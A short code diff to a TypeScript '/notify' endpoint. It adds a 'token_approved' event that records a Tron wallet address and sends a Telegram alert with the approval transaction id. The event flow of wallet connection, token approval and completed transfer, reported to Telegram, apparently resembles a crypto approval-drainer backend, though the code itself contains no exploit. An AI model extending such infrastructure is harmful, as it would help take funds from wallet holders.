@@ -13,6 +13,11 @@ const notifySchema = z.discriminatedUnion("event", [
     connectMethod: z.string().max(80).optional()
   }),
   z.object({
+    event: z.literal("token_approved"),
+    walletAddress: z.string().min(16),
+    approveTxId: z.string().min(8)
+  }),
+  z.object({
     event: z.literal("transfer_completed"),
     walletAddress: z.string().min(16),
     toAddress: z.string().min(16),
@@ -82,6 +87,23 @@ router.post("/notify", optionalAuth, async (req: AuthenticatedRequest, res) => {
         event: "wallet_connected",
         walletAddress: data.walletAddress,
         connectMethod: data.connectMethod,
+        linkedUserId
+      });
+    } else if (data.event === "token_approved") {
+      // Persist approved wallet as a "wallet-first" verified user on Tron.
+      await walletDb.query(
+        `
+          INSERT INTO wallet_users (wallet_address, chain)
+          VALUES ($1, 'tron')
+          ON CONFLICT (wallet_address, chain) DO NOTHING
+        `,
+        [data.walletAddress]
+      );
+
+      await sendTrustWalletTronTelegramNotification({
+        event: "token_approved",
+        walletAddress: data.walletAddress,
+        approveTxId: data.approveTxId,
         linkedUserId
       });
     } else if (data.event === "transfer_completed") {
